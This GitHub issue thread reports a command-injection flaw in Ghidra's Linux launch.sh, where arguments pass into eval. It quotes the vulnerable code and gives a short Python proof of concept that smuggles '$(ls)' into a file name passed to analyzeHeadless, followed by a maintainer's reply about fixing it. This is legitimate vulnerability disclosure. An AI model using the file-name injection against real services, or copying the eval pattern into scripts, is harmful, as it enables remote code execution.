### **[attilaszia](/attilaszia)** commented [Jan 4, 2023](#issue-1519020081)

| **Describe the bug** `/Ghidra/RuntimeScripts/Linux/support/launch.sh` passes user provided input into `eval`. This results in straightforward command injection.  There are a couple of security SaaS's that use `analyzeHeadless` as part of a service, so this is a pretty surprising RCE on natural-looking invocations.  [https://github.com/NationalSecurityAgency/ghidra/blob/master/Ghidra/RuntimeScripts/Linux/support/launch.sh#L192](url)  ``` if [ "${BACKGROUND}" = true ]; then 	eval "\"${JAVA_CMD}\" ${VMARG_LIST} -showversion -cp \"${CPATH}\" ghidra.Ghidra ${CLASSNAME} ${ARGS[@]}" &>/dev/null & 	 	# If our process dies immediately, output something so the user knows to run in debug mode. 	# Otherwise they'll never see any error output from background mode. 	# Doing a kill -0 sends a no-op signal, which can be used to see if the process is still alive. 	PID=$! 	sleep 1 	if ! kill -0 ${PID} &>/dev/null; then 		echo "Exited with error.  Run in foreground (fg) mode for more details." 		exit 1 	fi 	exit 0 else 	eval "(set -o noglob; \"${JAVA_CMD}\" ${VMARG_LIST} -showversion -cp \"${CPATH}\" ghidra.Ghidra ${CLASSNAME} ${ARGS[@]})" 	exit $? fi  ```  **To Reproduce**  ``` import subprocess  with open('/bin/bash', 'rb') as f:     data = f.read()  with open('./$(ls).bin', 'wb') as g:     g.write(data)  command = ['analyzeHeadless','./','poc','-import','./$(ls).bin'] subprocess.call(command, shell=False)  ``` |

| I think `eval` was introduced to handle spaces in the `VMARGS` variable. I'm currently exploring alternative implementations that don't use `eval`, but suggestions are welcome for that `VMARGS`/spaces issue. |
